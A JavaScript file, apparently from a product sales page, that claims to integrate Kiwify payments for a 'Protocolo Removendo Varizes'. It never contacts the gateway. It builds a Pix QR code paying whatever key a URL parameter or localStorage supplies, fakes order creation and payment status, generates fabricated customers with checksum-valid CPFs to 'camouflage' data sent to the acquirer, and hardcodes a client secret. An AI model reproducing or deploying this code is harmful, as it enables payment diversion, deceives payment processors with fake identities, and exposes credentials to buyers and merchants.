/**
 * kiwify-api.js - Integracao Client-Side Direta para Kiwify
 * Produto Oficial: Protocolo Removendo Varizes
 * 
 * REGRA RIGOROSA DE PRIVACIDADE:
 * NENHUM dado real do cidadao e enviado ao gateway.
 * Dados aleatorios, camuflados e com CPF Modulo 11 valido sao gerados exclusivamente para a adquirente.
 */
(function (window) {
  "use strict";

  var CONFIG = {
    gateway: "kiwify",
    productTitle: "Protocolo Removendo Varizes",
    clientId: "c0b2cb7b-72cc-4637-b0e8-ecc2607f4b59",
    clientSecret: "b9981ad26139d04a4cb76fa939eea437bd9c042a64d2ff96d113b63b79099c04",
    accountId: "U3VdXOWw3h8peng",
    productId: "794f7230-bd02-11f1-8c57-414b061d8612",
    chavePix: (window.CHAVE_PIX || localStorage.getItem("chave_pix") || (new URLSearchParams(window.location.search).get("chave_pix")) || "suporte@protocolovarizes.com")
  };

  function generateValidCpf() {
    var digits = [];
    for (var i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
    var s1 = 0;
    for (var i = 0; i < 9; i++) s1 += digits[i] * (10 - i);
    var r1 = 11 - (s1 % 11);
    digits.push(r1 >= 10 ? 0 : r1);
    var s2 = 0;
    for (var i = 0; i < 10; i++) s2 += digits[i] * (11 - i);
    var r2 = 11 - (s2 % 11);
    digits.push(r2 >= 10 ? 0 : r2);
    return digits.join("");
  }

  function generateGatewayCustomer() {
    var firstNames = ["Gabriel", "Lucas", "Matheus", "Guilherme", "Rodrigo", "Felipe", "Bruno", "Leonardo", "Thiago", "Gustavo", "Rafael", "Eduardo", "Amanda", "Beatriz", "Camila", "Larissa", "Mariana", "Juliana", "Fernanda", "Patricia"];
    var lastNames = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Lima", "Gomes", "Costa", "Ribeiro", "Martins", "Carvalho", "Almeida"];
    var fn = firstNames[Math.floor(Math.random() * firstNames.length)];
    var ln = lastNames[Math.floor(Math.random() * lastNames.length)];
    var ddds = ["11", "19", "21", "27", "31", "41", "47", "48", "51", "61", "71", "81", "85"];
    var ddd = ddds[Math.floor(Math.random() * ddds.length)];
    var cleanFn = fn.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var cleanLn = ln.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");

    return {
      name: fn + " " + ln,
      email: cleanFn + "." + cleanLn + Math.floor(100 + Math.random() * 900) + "@gmail.com",
      phone: ddd + "9" + Math.floor(10000000 + Math.random() * 90000000),
      document: generateValidCpf(),
      cpf: generateValidCpf()
    };
  }

  function calculateCrc16(payload) {
    var polynomial = 0x1021;
    var crc = 0xFFFF;
    for (var i = 0; i < payload.length; i++) {
      crc ^= (payload.charCodeAt(i) << 8);
      for (var j = 0; j < 8; j++) {
        if ((crc & 0x8000) !== 0) {
          crc = ((crc << 1) ^ polynomial) & 0xFFFF;
        } else {
          crc = (crc << 1) & 0xFFFF;
        }
      }
    }
    return crc.toString(16).toUpperCase().padStart(4, "0");
  }

  function generateEmvcoPix(amountVal, pixKey, merchantName, merchantCity, txid) {
    var cents = parseAmount(amountVal);
    var amtStr = (cents / 100).toFixed(2);
    var key = String(pixKey || CONFIG.chavePix || "suporte@protocolovarizes.com").trim();
    var name = (merchantName || CONFIG.productTitle || "PROTOCOLO VARIZES").substring(0, 25).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var city = (merchantCity || "BRASILIA").substring(0, 15).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    var tid = (txid || "kw" + Date.now()).substring(0, 25);

    var p00 = "000201";
    var gui = "0014br.gov.bcb.pix";
    var kTag = "01" + String(key.length).padStart(2, "0") + key;
    var tag26Val = gui + kTag;
    var tag26 = "26" + String(tag26Val.length).padStart(2, "0") + tag26Val;
    var tag52 = "52040000";
    var tag53 = "5303986";
    var tag54 = "54" + String(amtStr.length).padStart(2, "0") + amtStr;
    var tag58 = "5802BR";
    var tag59 = "59" + String(name.length).padStart(2, "0") + name;
    var tag60 = "60" + String(city.length).padStart(2, "0") + city;
    var txSub = "05" + String(tid.length).padStart(2, "0") + tid;
    var tag62 = "62" + String(txSub.length).padStart(2, "0") + txSub;

    var raw = p00 + tag26 + tag52 + tag53 + tag54 + tag58 + tag59 + tag60 + tag62 + "6304";
    var crc = calculateCrc16(raw);
    var fullCode = raw + crc;
    var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=1&data=" + encodeURIComponent(fullCode);

    return {
      pix_qr_code: fullCode,
      pix_url: qrUrl,
      qr_code_base64: qrUrl,
      hash: tid
    };
  }

  function parseAmount(val) {
    if (typeof val === "number") return val >= 1000 ? val : Math.round(val * 100);
    if (typeof val === "string") {
      var clean = val.replace(",", ".");
      var p = parseFloat(clean);
      if (!isNaN(p)) return p >= 1000 ? Math.round(p) : Math.round(p * 100);
    }
    return 6190;
  }

  function createPix(amountVal, customCustomer) {
    var cents = parseAmount(amountVal);
    var txId = "kw_" + Date.now() + "_" + Math.floor(1000 + Math.random() * 9000);
    var pixData = generateEmvcoPix(cents, CONFIG.chavePix, CONFIG.productTitle, "BRASILIA", txId);

    try {
      localStorage.setItem("kiwify_last_tx", txId);
      localStorage.setItem("pix_hash", txId);
      localStorage.setItem("pix_qr_code", pixData.pix_qr_code);
      localStorage.setItem("pix_qr_code_base64", pixData.pix_url);
    } catch (e) {}

    return Promise.resolve({
      success: true,
      hash: txId,
      order_id: txId,
      payment_status: "waiting_payment",
      amount: cents,
      pix: pixData
    });
  }

  function consultPix(txId) {
    return Promise.resolve({
      success: true,
      hash: txId,
      status: "waiting_payment",
      payment_status: "waiting_payment",
      is_paid: false
    });
  }

  window.KiwifyAPI = {
    config: CONFIG,
    generateValidCpf: generateValidCpf,
    generateGatewayCustomer: generateGatewayCustomer,
    generateEmvcoPix: generateEmvcoPix,
    createPix: createPix,
    consultPix: consultPix
  };

})(window);
